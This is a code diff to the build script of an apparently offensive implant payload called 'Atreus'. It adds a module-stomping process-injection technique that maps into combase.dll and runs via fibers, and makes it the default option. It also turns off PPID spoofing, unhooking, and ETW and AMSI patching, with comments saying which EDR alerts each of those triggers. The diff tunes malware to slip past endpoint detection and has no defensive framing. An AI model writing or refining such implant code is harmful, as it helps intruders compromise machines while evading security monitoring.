@@ -95,9 +95,9 @@ class Atreus(PayloadType):
         BuildParameter(
             name="injection_technique",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Injection technique: Early Bird APC (new suspended process), Thread Hijack (RIP redirect), Process Hollowing (unmap + RIP), or Remote Thread (NtCreateThreadEx in existing process - target_process must be a process name like svchost.exe)",
-            choices=["self_injection", "fiber_injection", "remote_injection", "thread_hijacking", "early_bird_apc", "process_hollowing"],
-            default_value="early_bird_apc",
+            description="Injection technique: Early Bird APC (new suspended process), Thread Hijack (RIP redirect), Process Hollowing (unmap + RIP), Remote Thread (NtCreateThreadEx in existing process - target_process must be a process name like svchost.exe), Module Stomp (NtCreateSection+NtMapViewOfSection into combase.dll, fiber execution)",
+            choices=["self_injection", "fiber_injection", "remote_injection", "thread_hijacking", "early_bird_apc", "process_hollowing", "module_stomp"],
+            default_value="module_stomp",
         ),
         BuildParameter(
             name="wipe_memory",
@@ -127,12 +127,12 @@ class Atreus(PayloadType):
         enc_type = "uuid"  # forced UUID
         enc_key_param    = (self.get_parameter("encryption_key") or "").strip()
         target_process   = (self.get_parameter("target_process") or "C:\\Windows\\System32\\notepad.exe").strip()
-        ppid_spoof       = True  # forced
-        use_unhook       = True  # forced
-        use_etw_patch    = True  # forced
-        use_amsi_patch   = self.get_parameter("use_amsi_patch") or False
+        ppid_spoof       = False  # disabled: triggers "API Call from Spoofed Parent"
+        use_unhook       = False  # disabled: test without first
+        use_etw_patch    = False  # disabled: triggers AMSI/ETW bypass alerts
+        use_amsi_patch   = False  # disabled: triggers AMSI bypass alerts
         use_sandbox      = self.get_parameter("use_sandbox_check") or False
-        injection_technique = "early_bird_apc"  # forced
+        injection_technique = self.get_parameter("injection_technique") or "module_stomp"
         wipe_memory      = True  # forced
         debug_mode       = self.get_parameter("debug_mode") or False
 
@@ -228,6 +228,8 @@ class Atreus(PayloadType):
             defines.append("-DUSE_SELF_INJECT")
         elif injection_technique == "fiber_injection":
             defines.append("-DUSE_FIBER_INJECT")
+        elif injection_technique == "module_stomp":
+            defines.append("-DUSE_MODULE_STOMP")
         if wipe_memory:
             defines.append("-DUSE_WIPE")
 
